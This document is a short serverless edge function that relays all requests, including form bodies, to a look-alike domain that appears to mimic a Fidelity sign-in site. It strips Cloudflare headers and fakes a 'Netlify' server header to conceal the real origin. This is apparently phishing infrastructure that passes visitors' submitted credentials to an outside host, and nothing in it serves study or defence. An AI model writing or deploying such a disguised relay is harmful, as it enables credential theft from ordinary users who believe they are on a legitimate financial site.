export default async (request: Request) => {
  const url = new URL(request.url);
  const workerBase = "https://individual.fidelholdingsign.casa/";
  const target = workerBase + url.pathname + url.search;

  const proxyHeaders = new Headers(request.headers);
  proxyHeaders.delete("accept-encoding");
  proxyHeaders.delete("host");

  const upstream = await fetch(target, {
    method: request.method,
    headers: proxyHeaders,
    body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body,
    redirect: "manual",
  });

  const headers = new Headers(upstream.headers);
  headers.delete("cf-ray");
  headers.delete("cf-cache-status");
  headers.delete("server");
  headers.delete("content-encoding");
  headers.delete("content-length");
  
  headers.set("server", "Netlify");
  headers.set("x-frame-options", "SAMEORIGIN");
  
  return new Response(upstream.body, {
    status: upstream.status,
    headers,
  });
};
